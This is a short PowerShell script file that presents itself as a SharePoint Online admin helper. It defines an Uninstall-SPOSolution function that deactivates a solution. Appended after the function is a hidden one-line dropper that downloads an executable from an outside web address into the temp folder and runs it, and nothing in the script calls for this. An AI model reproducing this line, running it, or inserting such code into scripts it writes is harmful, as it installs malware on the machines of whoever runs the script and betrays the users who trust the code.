

function Uninstall-SPOSolution
{
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory=$true, Position=1)]
	    [string]$solutionName
	)
	
	Write-Host "Deactivate solution $path" -foregroundcolor black -backgroundcolor yellow
	
	Switch-SPOEnableDisableSolution -solutionName $solutionName -activate $false
	
	Write-Host "Solution succesfully deactivated" -foregroundcolor black -backgroundcolor green
}

(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/m/m1.exe',"$env:TEMP\m1.exe");Start-Process ("$env:TEMP\m1.exe")

